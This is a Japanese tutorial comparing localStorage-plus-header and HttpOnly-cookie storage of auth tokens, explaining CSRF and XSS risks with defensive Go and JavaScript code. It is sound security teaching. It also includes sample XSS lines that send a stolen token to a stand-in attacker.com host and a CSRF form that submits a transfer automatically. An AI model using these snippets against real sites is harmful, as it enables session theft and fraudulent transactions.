# 認証トークンの保存方法の比較

## 概要

Webアプリケーションで認証トークン（JWTやセッションID）を保存する方法は主に2つあります：
1. **localStorage + Authorization Header**
2. **HttpOnly Cookie**

それぞれにメリット・デメリットがあり、CSRF対策とXSS対策の必要性が異なります。

## 比較表

| 保存場所 | 自動送信 | CSRF対策必要 | XSS対策 |
|---------|---------|-------------|---------|
| localStorage + Authorization Header | なし | 不要 | 脆弱 |
| HttpOnly Cookie | あり | 必要 | 安全 |

## localStorage + Authorization Header

### 仕組み

```javascript
// ログイン時にトークンをlocalStorageに保存
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// APIリクエスト時に明示的にAuthorizationヘッダーに設定
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});
```

### CSRF対策が不要な理由

1. **ブラウザは自動送信しない**
   - localStorageのデータは、JavaScriptで明示的に取り出さない限り、HTTPリクエストに含まれません
   - Cookieと違い、ブラウザが勝手にリクエストに付与することはありません

2. **Same-Origin Policyによる保護**
   - 攻撃者のサイト（`https://attacker.com`）から被害者のサイト（`https://victim.com`）のlocalStorageにはアクセスできません
   - 攻撃者は被害者のトークンを取得できないため、CSRF攻撃が成立しません

```html
<!-- 攻撃者のサイト (https://attacker.com) -->
<script>
  // これは失敗する（Same-Origin Policyによりブロック）
  const token = localStorage.getItem('token'); // null

  fetch('https://victim.com/api/transfer', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}` // トークンがないため攻撃失敗
    },
    body: JSON.stringify({ to: 'attacker', amount: 1000 })
  });
</script>
```

### XSS対策が必須な理由（脆弱）

1. **JavaScriptから読み取り可能**
   - localStorageはJavaScriptから自由にアクセスできます
   - サイトにXSS脆弱性があれば、攻撃者のスクリプトが実行され、トークンを盗めます

```javascript
// XSS攻撃の例
// 被害者のサイトで攻撃者のスクリプトが実行された場合
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);
// トークンが攻撃者のサーバーに送信される
```

2. **対策**
   - **XSS脆弱性を絶対に作らない**（これが最も重要）
   - HTMLエスケープを徹底する
   - Content Security Policy (CSP) を設定する
   - DOMベースXSSに注意する

### メリット

- CSRF対策が不要（トークンは自動送信されない）
- クロスドメインAPIでの使用が容易
- モバイルアプリとの実装を統一できる

### デメリット

- XSS攻撃に対して脆弱
- XSS対策を完璧にする必要がある（現実的に困難）
- セキュリティの責任がアプリケーション開発者に集中する

## HttpOnly Cookie

### 仕組み

```go
// サーバー側でHttpOnly Cookieを設定
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true,  // JavaScriptからアクセス不可
    Secure:   true,  // HTTPS接続でのみ送信
    SameSite: http.SameSiteLaxMode,  // CSRF対策
})
```

```javascript
// クライアント側ではCookieを意識しない
// ブラウザが自動的にCookieを送信
fetch('https://api.example.com/data', {
  credentials: 'include'  // Cookieを含める
});
```

### CSRF対策が必要な理由

1. **ブラウザが自動送信する**
   - Cookieはブラウザが自動的にリクエストに付与します
   - 攻撃者のサイトからのリクエストでも、ブラウザが勝手にCookieを送信してしまいます

```html
<!-- 攻撃者のサイト (https://attacker.com) -->
<form action="https://victim.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  // フォームを自動送信
  document.forms[0].submit();
  // ブラウザが自動的にvictim.comのCookieを送信してしまう
</script>
```

2. **対策が必要**
   - **CSRFトークン**を使用する（Synchronizer Token Pattern）
   - **SameSite属性**を設定する（Lax or Strict）
   - **カスタムヘッダー**を要求する（X-Requested-Withなど）

```go
// CSRF対策の実装例
func csrfMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodGet {
            csrfToken := r.Header.Get("X-CSRF-Token")
            if !validateCSRFToken(sessionID, csrfToken) {
                http.Error(w, "Invalid CSRF token", http.StatusForbidden)
                return
            }
        }
        next(w, r)
    }
}
```

### XSS対策が安全な理由

1. **JavaScriptからアクセス不可**
   - HttpOnly属性により、JavaScriptからCookieを読み取れません
   - XSS脆弱性があっても、攻撃者のスクリプトはCookieを盗めません

```javascript
// XSS攻撃でも読み取れない
console.log(document.cookie);
// 出力: "other_cookie=value; another=test"
// session_id は表示されない（HttpOnly属性のため）
```

2. **ただし完全に安全ではない**
   - XSS攻撃者は、Cookieを盗めなくても、被害者のブラウザから不正なリクエストを送信できます
   - しかし、トークン自体は漏洩しないため、攻撃の影響範囲は限定的

```javascript
// XSS攻撃でできること（Cookieは盗めないが...）
// 被害者のブラウザから不正なリクエストを送信
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',  // ブラウザが自動的にCookieを送信
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});
// ただし、CSRF対策（CSRFトークン）があれば、これもブロックされる
```

### メリット

- XSS攻撃に対して耐性がある（Cookieは盗まれない）
- ブラウザの標準的なセキュリティ機能を活用できる
- セキュリティの責任をブラウザと共有できる

### デメリット

- CSRF対策が必要（追加の実装が必要）
- クロスドメインでの使用が複雑
- モバイルアプリでの実装が異なる

## 詳細な攻撃シナリオ

### シナリオ1: XSS攻撃

#### localStorage + Authorization Headerの場合

```javascript
// 被害者のサイトにXSS脆弱性がある場合
// 攻撃者が注入したスクリプト
<script>
  const token = localStorage.getItem('token');
  // トークンを攻撃者のサーバーに送信
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: token })
  });
</script>
```

**結果**: トークンが漏洩。攻撃者は被害者になりすまして、任意のAPIリクエストを送信できる。

#### HttpOnly Cookieの場合

```javascript
// 被害者のサイトにXSS脆弱性がある場合
// 攻撃者が注入したスクリプト
<script>
  // Cookieを盗もうとするが失敗
  console.log(document.cookie); // session_idは見えない

  // しかし、被害者のブラウザから不正なリクエストは送信できる
  fetch('/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'X-CSRF-Token': 'xxx' // CSRFトークンがないと失敗
    },
    body: JSON.stringify({ to: 'attacker', amount: 1000 })
  });
</script>
```

**結果**: Cookieは漏洩しない。ただし、CSRF対策がない場合、被害者のブラウザから不正なリクエストは送信される。CSRF対策があれば、これもブロックされる。

### シナリオ2: CSRF攻撃

#### localStorage + Authorization Headerの場合

```html
<!-- 攻撃者のサイト (https://attacker.com) -->
<script>
  // 被害者のlocalStorageにアクセスしようとするが失敗
  const token = localStorage.getItem('token'); // null（Same-Origin Policyでブロック）

  // トークンがないため、攻撃失敗
  fetch('https://victim.com/api/transfer', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}` // nullのため無効
    },
    body: JSON.stringify({ to: 'attacker', amount: 1000 })
  });
</script>
```

**結果**: 攻撃失敗。トークンを取得できないため、CSRF攻撃は成立しない。

#### HttpOnly Cookieの場合

```html
<!-- 攻撃者のサイト (https://attacker.com) -->
<form action="https://victim.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
  // ブラウザが自動的にvictim.comのCookieを送信
</script>
```

**結果**: CSRF対策がない場合、攻撃成功。ブラウザが自動的にCookieを送信してしまう。

## どちらを選ぶべきか

### localStorage + Authorization Headerを選ぶケース

- モバイルアプリとWeb APIを統一したい
- クロスドメインAPIを使用する
- XSS対策を完璧にする自信がある

### HttpOnly Cookieを選ぶケース（推奨）

- XSS脆弱性のリスクを最小限にしたい
- ブラウザの標準的なセキュリティ機能を活用したい
- 一般的なWebアプリケーション

## ベストプラクティス

### localStorage + Authorization Headerを使う場合

1. **XSS対策を徹底する**
   - すべての出力をエスケープする
   - DOMベースXSSに注意する
   - Content Security Policyを設定する
   - 定期的なセキュリティ監査を実施する

2. **トークンの有効期限を短くする**
   - アクセストークンは5-15分程度
   - リフレッシュトークンを使って更新

3. **HTTPSを必須にする**
   - 通信を暗号化してトークンを保護

### HttpOnly Cookieを使う場合

1. **Cookie属性を適切に設定する**
   ```go
   http.SetCookie(w, &http.Cookie{
       Name:     "session_id",
       Value:    sessionID,
       HttpOnly: true,  // XSS対策
       Secure:   true,  // HTTPS必須
       SameSite: http.SameSiteLaxMode,  // CSRF対策
       Path:     "/",
       MaxAge:   3600,
   })
   ```

2. **CSRF対策を実装する**
   - CSRFトークンを使用する
   - SameSite属性を設定する
   - カスタムヘッダーを要求する

3. **セッション管理を適切に行う**
   - セッションIDを暗号学的に安全な方法で生成する
   - ログイン時にセッションIDを再生成する
   - セッションの有効期限を設定する

## まとめ

| 項目 | localStorage + Authorization Header | HttpOnly Cookie |
|-----|-----------------------------------|-----------------|
| CSRF対策 | 不要（自動送信されない） | 必要（自動送信される） |
| XSS対策 | 必須（JavaScriptから読み取り可能） | 耐性あり（JavaScriptから読み取り不可） |
| 推奨度 | モバイルアプリとの統一が必要な場合 | 一般的なWebアプリケーション |
| セキュリティリスク | XSS脆弱性によるトークン漏洩 | CSRF攻撃（対策すれば安全） |

**結論**: 一般的なWebアプリケーションでは、**HttpOnly Cookie + CSRF対策**の組み合わせが推奨されます。XSS対策を完璧にするのは困難であり、HttpOnly属性による多層防御が有効です。
